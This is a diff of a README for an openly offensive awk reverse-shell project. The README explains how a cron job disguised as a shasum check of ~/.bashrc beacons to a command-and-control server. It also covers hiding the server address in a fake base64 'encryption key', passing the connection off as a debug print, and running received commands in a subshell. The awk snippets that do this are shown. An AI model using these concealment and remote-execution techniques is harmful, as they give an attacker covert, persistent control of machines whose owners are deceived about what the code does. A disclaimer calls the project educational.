@@ -1,18 +1,22 @@
 # awkwrd
 
-The `awk` reverse shell. `checkrc.awk` runs on a target host, periodically requesting remote tasks from a command/control server.
+An awk reverse shell.
 
-## install.sh
+## Purpose
 
-This file can be used to fully install the `checkrc.awk` and its cron component on a target host in a single command.
+The `checkrc.awk` command periodically calls out to a remote server and executes its commands. It is disguised as a recurring task to take the shasum of a file (e.g. to track when it is modified).
 
-## checkrc.awk
+## Install
+Create the main `checkrc.awk` file, encryption key, and cron settings.
+```
+./install.sh
+```
 
-This file is run as a cronjob on a target host. It is disguised as a recurring task to take a shasum of some file (like a bashrc) to track when changes are made.
+## How it works
 
-### How it works
+Before we dig into the code, we need some background on the encryption key that gets generated.
 
-#### The "encryption key"
+### The "encryption key"
 
 After running `./install.sh`, a base64-encoded file should be saved to `$HOME/.checkrc/.enc.key`. This looks like a stream of random bytes, but it's actually been carefully crafted to encode an awk-style TCP URI (see [awk Network Programming](https://www.gnu.org/software/gawk/manual/html_node/TCP_002fIP-Networking.html)).
 
@@ -22,7 +26,7 @@ $ base64 -d $HOME/.checkrc/.enc.key | awk '{print $2$4$6$8$10$12$14$16$18$20}'
 /inet/tcp/0/localhost/8888
 ```
 
-#### Getting the Host URL
+### Getting the Host URL
 The first few lines of `checkrc.awk` simply read the key we see above, with some indirection around reading the even-numbered columns. As we know, we get a hostname out of this. Meanwhile, the reader believes we have loaded a private key into memory.
 ```awk
 # load key into memory two bytes at a time
@@ -30,8 +34,8 @@ The first few lines of `checkrc.awk` simply read the key we see above, with some
 for (i=2;i<=NF;i+=2) key=key$i
 ```
 
-#### Sending the Request
-The `HMAC generation` step exists mostly for indirection, except for the print statement. Those familiar with `awk` coprocesses and networking will note that this print statement actually opens a connection to our host above (`localhost:8888`) and sends the text `"starting with key "`.
+### Sending the Request
+The entire "HMAC generation" step exists mostly for indirection, except for the print statement. Those familiar with `awk` coprocesses and networking will note that this print statement actually opens a connection to our host above (`localhost:8888`) and sends the text `"starting with key "`.
 
 Our command and control server would be set up to handle this input, while to the reader, this looks like a harmless debug statement.
 ```awk
@@ -40,8 +44,8 @@ print "starting with key " |& key
 system(sprintf("openssl dgst -sha1 -hmac %s ~/.bashrc >>$HOME/shasums.txt", key))
 ```
 
-#### Remote Execution
-This is the core of the script that reads data from the remote server and executes it. We hide it by talking about confusing concepts, but it's a difficult part to fully obfuscate.
+### Remote Execution
+This is the core of the script that reads data from the remote server and executes it. We hide it by talking about traditionally confusing concepts, but it's a difficult part to fully obfuscate (I'm open to suggestions).
 
 ```awk
 # flush buffers and clean up file descriptors
@@ -50,13 +54,13 @@ close(key|&getline)($0|getline)
 
 Let's break down what's going on here.
 1. `key |& getline` reads a response from the host (`localhost:8888`), and populate the global variable `$0` with the response data.
-2. `close()` is actually used to close the connection
+2. `close()` actually does close the connection
 3. `($0 | getline)` executes the received data in a subshell. This could also be accomplished by `system($0)`.
 
-## server.awk
+## Remote Server
 
-A test server that sends remote tasks to be executed on the target host upon request.
+This client assumes you have a remote server that can issue commands upon request. `server.awk` exists as a test server that sends remote tasks to be executed on the target host upon request. Creating a more configurable server is outside the scope of this project.
 
-### Disclaimer
+## Disclaimer
 
 This project is for educational and research purposes only. The author is not responsible for individuals who misuse these materials for illegal purposes.
